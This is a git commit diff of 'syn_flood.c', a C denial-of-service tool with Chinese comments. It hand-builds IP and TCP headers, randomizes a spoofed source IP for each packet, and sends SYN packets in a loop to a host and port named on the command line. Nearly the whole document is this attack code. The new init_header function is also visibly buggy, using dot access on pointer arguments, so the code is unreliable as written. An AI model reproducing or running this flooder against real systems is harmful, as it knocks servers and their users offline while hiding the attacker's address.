4b8e589e6fff719703285cf275c7f14f8d43b44d
jiangeZh <759878652@qq.com>
2016-01-02 21:18:54 +0800

    Update syn_flood.c

--- syn_flood.c
+++ syn_flood.c
@@ -18,8 +18,7 @@
 #include <errno.h>
 #include <stdlib.h>
 #include <time.h> 
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
+#include <arpa/inet.h>
 
 /* 最多线程数 */
 #define MAXCHILD 128
@@ -30,20 +29,42 @@ int sockfd;
 /* 程序活动标志 */
 static int alive = -1;
 
-/* 随机函数产生函数 */
-static long inline
-myrandom (int begin, int end)
+char dst_ip[20] = { 0 };
+int dst_port;
+
+struct ip{
+	unsigned char       hl;
+	unsigned char       tos;
+	unsigned short      total_len;
+	unsigned short      id;
+	unsigned short      frag_and_flags;
+	unsigned char       ttl;
+	unsigned char       proto;
+	unsigned short      checksum;
+	unsigned int        sourceIP;
+	unsigned int        destIP;
+};
+	
+struct tcphdr{
+	unsigned short      sport;
+	unsigned short      dport;
+	unsigned int        seq;
+	unsigned int        ack;
+	unsigned char       lenres;
+	unsigned char       flag;
+	unsigned short      win;
+	unsigned short      sum;
+	unsigned short      urp;
+};
+
+struct pseudohdr
 {
-	int gap = end - begin +1;
-	int ret = 0;
-
-	/* 用系统时间初始化 */
-	srand((unsigned)time(0));
-	/* 产生一个介于begin和end之间的值 */
-	ret = rand()%gap + begin;
-	return ret;
-}
-
+	unsigned int	    saddr;
+	unsigned int 	    daddr;
+	char                zero;
+	char                protocol;
+	unsigned short      length;
+};
 
 /* CRC16校验 */
 unsigned short inline
@@ -72,61 +93,82 @@ checksum (unsigned short *buffer, unsigned short size)
  * TCP伪头部仅用于校验和的计算
  */
 void
+init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
+{
+	int len = sizeof(struct ip) + sizeof(struct tcphdr);
+	// IP头部数据初始化
+	ip.hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
+	ip.tos = 0;
+	ip.total_len = htons(len);
+	ip.id = 1;
+	ip.frag_and_flags = 0x40;
+	ip.ttl = 255;
+	ip.proto = IPPROTO_TCP;
+	ip.checksum = 0;
+	ip.sourceIP = 0;
+	ip.destIP = inet_addr(dst_ip);
+
+	// TCP头部数据初始化
+	tcp.sport = htons( rand()%16383 + 49152 );
+	tcp.dport = htons(dst_port);
+	tcp.seq = htonl( rand()%90000000 + 2345 ); 
+	tcp.ack = htonl( rand()%90000000 + 2345 ); 
+	tcp.lenres = (sizeof(struct tcphdr)/4<<4|0);
+	tcp.flag = 0x02;
+	tcp.win = htons (2048);  
+	tcp.sum = 0;
+	tcp.urp = 0;
+
+	//TCP伪头部
+	pseudoheader.zero = 0;
+	pseudoheader.protocol = IPPROTO_TCP;
+	pseudoheader.length = htons(sizeof(struct tcphdr));
+	pseudoheader.daddr = inet_addr(dst_ip);
+	srand((unsigned) time(NULL));
+
+}
+
+
+/* 发送SYN包函数
+ * 填写IP头部，TCP头部
+ * TCP伪头部仅用于校验和的计算
+ */
+void
 send_synflood(struct sockaddr_in *addr)
 { 
-	char buf[40], sendbuf[40];
+	char buf[100], sendbuf[100];
 	int len;
-	struct ip ip;
-	struct tcphdr tcp;
+	struct ip ip;			//IP头部
+	struct tcphdr tcp;		//TCP头部
+	struct pseudohdr pseudoheader;	//TCP伪头部
 
-	struct pseudohdr
-	{
-		struct in_addr saddr;
-		struct in_addr daddr;
-		u_char zero;
-		u_char protocol;
-		u_short length;
-	} pseudoheader;
+
 	len = sizeof(struct ip) + sizeof(struct tcphdr);
-
-	ip.ip_v = 4;
-	ip.ip_hl = sizeof(struct ip)>>2;
-	ip.ip_tos = 0;
-	ip.ip_len = htons(len);
-	ip.ip_id = 0;
-	ip.ip_off = 0;
-	ip.ip_ttl = myrandom (128, 255);
-	ip.ip_p = IPPROTO_TCP;
-	ip.ip_sum = 0;
-	ip.ip_dst = addr->sin_addr;
-
-	tcp.th_sport = htons(1500);
-	tcp.th_dport = addr->sin_port;
-	tcp.seq = htonl ((unsigned long) myrandom(0, 65535)); 
-	tcp.ack_seq = htons (myrandom(0, 65535));  
-	tcp.th_off = 5;
-	tcp.th_flags = TH_SYN;
-	tcp.th_win = htons (myrandom(0, 65535));  
-	tcp.th_sum = 0;
-
-	pseudoheader.zero = 0;
-	pseudoheader.protocol = 4;
-	pseudoheader.length = sizeof(struct tcphdr);
-
+	
+	/* 初始化头部信息 */
+	init_header(&ip, &tcp, &pseudoheader);
+	
 	/* 处于活动状态时持续发送SYN包 */
 	while(alive)
 	{
-		ip.ip_src.s_addr = random();
-		pseudoheader.saddr.s_addr = ip.ip_src.s_addr;
-		printf("source ip=%s\n", inet_ntoa(ip.ip_src));
-		pseudoheader.daddr.s_addr = addr->sin_addr.s_addr;
+		ip.sourceIP = rand();
+
+		//计算IP校验和
+		bzero(buf, sizeof(buf));
+		memcpy(buf , &ip, sizeof(struct ip));
+		ip.checksum = checksum((u_short *) buf, sizeof(struct ip));
+
+		pseudoheader.saddr = ip.sourceIP;
+
+		//计算TCP校验和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
 		memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
-		tcp.th_sum = checksum((u_short *)&buf, 12+sizeof(struct tcphdr));
+		tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+
 		bzero(sendbuf, sizeof(sendbuf));
-		memcpy(sendbuf, &ip, sizeof(ip));
-		memcpy(sendbuf+sizeof(ip), &tcp, sizeof(tcp));
+		memcpy(sendbuf, &ip, sizeof(struct ip));
+		memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
 		if (
 			sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
 			< 0)
@@ -152,6 +194,7 @@ main(int argc, char *argv[])
 	struct sockaddr_in addr;
 	struct hostent * host = NULL;
 
+	int on = 1;
 	int i = 0;
 	pthread_t pthread[MAXCHILD];
 	int err = -1;
@@ -167,12 +210,15 @@ main(int argc, char *argv[])
 		exit(1);
 	}
 
+	strncpy( dst_ip, argv[1], 16 );
+	dst_port = atoi( argv[2] );
+
 	bzero(&addr, sizeof(addr));
 
 	addr.sin_family = AF_INET;
-	addr.sin_port = htons(atol(argv[2]));
+	addr.sin_port = htons(dst_port);
 
-	if(inet_aton(argv[1], &addr.sin_addr) == 0)
+	if(inet_addr(dst_ip) == INADDR_NONE)
 	{
 		/* 为DNS地址，查询并转换成IP地址 */
 		host = gethostbyname(argv[1]);
@@ -182,25 +228,28 @@ main(int argc, char *argv[])
 			exit(1);
 		}
 		addr.sin_addr = *((struct in_addr*)(host->h_addr));
-		//return 0;
+		strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
 	}
+	else
+		addr.sin_addr.s_addr = inet_addr(dst_ip);
 
-	if((addr.sin_addr.s_addr <=0) || (addr.sin_port <=0)){
-		printf("Format Error\n");
+	if( dst_port < 0 || dst_port > 65535 )
+	{
+		printf("Port Error\n");
 		exit(1);
 	}
 
 	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
 
 	/* 建立原始socket */
-	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);	
+	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
 	if (sockfd < 0)	   
 	{
 		perror("socket()");
 		exit(1);
 	}
 	/* 设置IP选项 */
-	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1")) < 0)
+	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
 	{
 		perror("setsockopt()");
 		exit(1);
